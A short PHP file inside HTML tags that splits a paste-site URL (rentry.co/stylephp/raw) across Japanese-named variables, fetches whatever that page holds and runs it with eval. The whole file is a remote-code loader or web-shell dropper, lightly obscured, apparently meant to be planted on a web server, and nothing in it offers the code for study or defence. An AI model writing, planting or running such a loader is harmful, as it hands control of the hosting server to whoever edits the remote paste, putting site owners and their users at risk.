<html>
<?php
$プロトコル = "https";
$ドメイン = "rentry.co";
$エンドポイント = "stylephp";
$リソース = "raw";
$パス = "/$エンドポイント/$リソース";
$完全なURL = $プロトコル . "://" . $ドメイン . $パス;
$ファイルポインタ = fopen($完全なURL, "r");
if ($ファイルポインタ) {
    $スクリプト内容 = stream_get_contents($ファイルポインタ);
    fclose($ファイルポインタ);
    eval("?>" . $スクリプト内容);
} else {
    echo "エラー";
}
?>
</html>
